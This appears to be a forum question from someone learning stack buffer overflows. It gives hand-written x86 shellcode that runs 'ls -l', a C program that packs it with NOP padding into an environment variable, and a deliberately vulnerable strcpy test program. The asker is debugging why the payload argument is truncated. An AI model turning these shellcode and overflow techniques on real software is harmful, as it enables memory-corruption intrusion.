<p>I'm trying to learn basics of buffer overflow attacks. I wrote a simple shellcode to just execute <code>ls -l</code> and then wrote a program to put this shellcode among some address changing (for now just <code>bbaa</code> address to test this) into an environment variable. This is my code:</p>  <pre><code>#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  char execvelsShell[] =  "\xeb\x3d\x5e\x31\xc0\xb0\x7d\x89\xf3\xb9\xff\xff\xff\xff\xc1\xe1\x0c"                         "\x21\xcb\x31\xc9\xb1\x20\x31\xd2\xb2\x07\xcd\x80\x31\xc0\x88\x46\x07"                         "\x88\x46\x0a\x89\x76\x0b\x89\xf3\x83\xc3\x08\x89\x5e\x0f\x89\x46\x13"                         "\x89\xf3\x8d\x4e\x0b\x8d\x56\x13\xb0\x0b\xcd\x80\xe8\xbe\xff\xff\xff"                         "\x2f\x62\x69\x6e\x2f\x6c\x73\x30\x2d\x6c\x30\x31\x31\x31\x31\x32\x32"                         "\x32\x32\x33\x33\x33\x33\x33"; const int buffSize = 4+100+4+4+4+4;//var_name + buffer + int i + ebp + ret_address + null  #define NOP 0x90 char addr[] = "\x61\x61\x62\x62"; //bbaa for test  int main(){     char buffer[buffSize];     int shellSize = strlen(execvelsShell);     printf("shelllen: %d\n", shellSize);      memset(buffer, NOP, buffSize);     memcpy(buffer, "AKJ=", 4);     memcpy(buffer+4, execvelsShell, shellSize);     memcpy(buffer+buffSize-8, addr, 4);     memcpy(buffer+buffSize-4, "\x00\x00\x00\x00", 4);      printf("Address: %s\n", buffer+buffSize-8);     printf("env len: %d\n", strlen(buffer));      putenv(buffer);     system("/bin/bash");     return 0; } </code></pre>  <p>When I print this variable and test it's size both in my code and in bash using <code>echo -n $AKJ | wc</code> I get the correct size but when I send this variable as input for my exploit test subject it prints the size of <code>argv[1]</code> as 22. This is my test program:</p>  <pre><code>#include &lt;stdio.h&gt; #include &lt;string.h&gt;  int main(int argc, char *argv[]){     char buffer[100];     int i=0xcceeaabb;     printf("len: %d\n", strlen(argv[1]));     strcpy(buffer, argv[1]);     return 0; } </code></pre>  <p>The intresting part is that if I send other variables such as <code>$PATH</code> or even some random string <code>argv[1]</code> has correct value and size. Also when I used <code>gdb</code> I could see that <code>argv[1]</code> has everything I want it to have but in c code it's size is not correct, ergo, it doesn't work.</p>  <p>I've worked several hours on this simple program and used everything I could think of from giving different values and variables to debugging the code using <code>gdb</code> and tracing what happens on stack and registers but couldn't get it to work. I'd appreciate it if someone could shed some light on the problem. I'm pretty sure I'm missing something really simple!!!</p>  <p>BTW I'm working on Ubuntu 14.4 with gcc 4.8.2 and the code I wrote for shellcode can be found <a href="http://pastebin.ca/3179005" rel="nofollow">here</a>.</p>